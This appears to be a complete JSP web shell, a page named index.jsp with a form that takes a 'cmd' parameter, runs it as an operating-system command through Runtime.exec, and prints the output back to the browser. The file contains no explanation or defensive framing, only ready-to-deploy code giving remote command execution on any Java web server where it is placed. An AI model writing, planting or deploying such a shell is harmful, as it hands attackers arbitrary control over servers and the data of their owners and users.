<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   //read url parameter
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
      	 //create process and execute command
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         //read response of command
	 BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { 
	 	output += s+"</br>"; 
	 }
      }  
      catch(IOException e) {   
      	e.printStackTrace();   
      }
   }
%>
<pre><%=output %></pre>


